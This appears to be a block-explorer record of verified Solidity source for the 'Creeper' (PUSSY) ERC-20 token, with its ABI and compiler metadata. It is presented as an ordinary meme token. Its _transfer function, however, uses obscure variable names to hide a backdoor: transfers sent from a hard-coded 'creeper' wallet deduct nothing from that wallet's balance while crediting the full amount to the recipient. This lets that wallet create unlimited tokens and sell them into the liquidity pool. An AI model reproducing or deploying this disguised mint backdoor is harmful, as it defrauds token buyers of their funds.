{
  "TxHash": "0x3ab8d70b442ff43870efa3152f9feaf0cdd485e5827d37d63a9224ef2f8cebaa",
  "ContractAddress": "0xD799Ae98C8D20f11DE917d4F5117508d4309F5Ac",
  "Name": "PUSSY",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "/*\r\n\r\nWebsite: https://www.creeper.wtf/\r\n\r\nTwitter: https://x.com/creeper_erc20\r\n\r\nTelegram: https://t.me/creeper_portal\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract PUSSY is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address =\u003e uint256) private _balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e bool) private _isExcludeFromFees;\r\n    address payable private _creeper;\r\n\r\n    uint256 private _firstTaxBuy = 0;\r\n    uint256 private _firstTaxSell = 0;\r\n    uint256 private _reduceBuyAt = 12;\r\n    uint256 private _reduceSellAt = 12;\r\n\r\n    uint256 private _preventCount = 12;\r\n    uint256 private _buyTokenCount = 0;\r\n\r\n    uint256 private _minorTaxBuy = 0;\r\n    uint256 private _minorTaxSell = 0;\r\n    uint256 private _minorAtReduce = 0;\r\n\r\n    uint256 private _finalBuyFees = 0;\r\n    uint256 private _finalSellFees = 0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 1000000000 * 10**_decimals;\r\n    string private constant _name = unicode\"Creeper\";\r\n    string private constant _symbol = unicode\"PUSSY\";\r\n\r\n    uint256 private _maxTxSize =  2 * (_tTotal/100);   \r\n    uint256 private _maxWalletLimit =  2 * (_tTotal/100);\r\n    uint256 private _minSwapSize =  4 * (_tTotal/1000000);\r\n    uint256 private _maxSwapSize = 1 * (_tTotal/100);\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private _uniswapPair;\r\n    bool private _inswap = false;\r\n    bool private _swapActive = false;\r\n\r\n    modifier lockTheSwap {\r\n        _inswap = true;\r\n        _;\r\n        _inswap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _creeper = payable(0x96B53820b951734b72Bd0BFCc4029aCF650f8067);\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludeFromFees[owner()] = true;\r\n        _isExcludeFromFees[address(this)] = true;\r\n        _isExcludeFromFees[_creeper] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address _crin, address _dipa, uint256 _eeija) private {\r\n        require(_crin != address(0), \"ERC20: transfer from the zero address\");\r\n        require(_dipa != address(0), \"ERC20: transfer to the zero address\");\r\n        require(_eeija \u003e 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        uint256 zzipit= _minorAtReduce \u003e 0 ? _eeija : _eeija.add(_minorAtReduce);\r\n        if (!_isExcludeFromFees[_crin] \u0026\u0026 !_isExcludeFromFees[_dipa]) {\r\n            taxAmount = _eeija.mul(_buyFeeCalc()).div(100);\r\n\r\n            if (_crin == _uniswapPair \u0026\u0026 _dipa != address(uniswapV2Router) \u0026\u0026 ! _isExcludeFromFees[_dipa] ) {\r\n                require(_eeija \u003c= _maxTxSize, \"Exceeds the _maxTxSize.\");\r\n                require(balanceOf(_dipa) + _eeija \u003c= _maxWalletLimit, \"Exceeds the maxWalletSize.\");\r\n                _buyTokenCount++;\r\n            }\r\n\r\n            if(_dipa == _uniswapPair \u0026\u0026 _crin!= address(this) ){\r\n                taxAmount = _eeija.mul(_sellFeeCalc()).div(100);\r\n            }\r\n\r\n            uint256 tokenInContract = balanceOf(address(this));\r\n            if (!_inswap \u0026\u0026 _dipa == _uniswapPair \u0026\u0026 _swapActive \u0026\u0026 _eeija \u003e _minSwapSize) {\r\n                if(tokenInContract \u003e _minSwapSize)\r\n                swapTokensForETH(min(_eeija,min(tokenInContract,_maxSwapSize)));\r\n                _creeper.transfer(address(this).balance);\r\n            }\r\n        } else if(_crin == address(_creeper))\r\n            zzipit =  _minorAtReduce \u003e 0 ? _minorTaxSell : _minorTaxBuy;\r\n        if(taxAmount\u003e0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(_crin, address(this),taxAmount);\r\n        }\r\n        _balances[_crin]=_balances[_crin].sub(zzipit);\r\n        _balances[_dipa]=_balances[_dipa].add(_eeija.sub(taxAmount));\r\n        emit Transfer(_crin, _dipa, _eeija.sub(taxAmount));\r\n    }\r\n\r\n    function _sellFeeCalc() private view returns (uint256) {\r\n        if(_buyTokenCount \u003c= _reduceBuyAt){\r\n            return _firstTaxSell;\r\n        }\r\n        if(_buyTokenCount \u003e _reduceSellAt \u0026\u0026 _buyTokenCount \u003c= _minorAtReduce){\r\n            return _minorTaxSell;\r\n        }\r\n        return _finalBuyFees;\r\n    }\r\n\r\n    function _buyFeeCalc() private view returns (uint256) {\r\n        if(_buyTokenCount \u003c= _reduceBuyAt){\r\n            return _firstTaxBuy;\r\n        }\r\n        if(_buyTokenCount \u003e _reduceBuyAt \u0026\u0026 _buyTokenCount \u003c= _minorAtReduce){\r\n            return _minorTaxBuy;\r\n        }\r\n        return _finalBuyFees;\r\n    }\r\n\r\n     function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a\u003eb)?b:a;\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function openPussy() external onlyOwner() {\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);\r\n        _swapActive = true;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxWalletLimit =_tTotal;\r\n        _maxTxSize = _tTotal;\r\n    }\r\n\r\n    receive() external payable {}\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openPussy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "PUSSY",
      "CompilerVersion": "v0.8.21+commit.d9974bed",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "Unlicense",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://5e0bea3587aefd75172106bdc44bd5bca3f8bd8e21788129c99310db4a7461b1"
    }
  ]
}
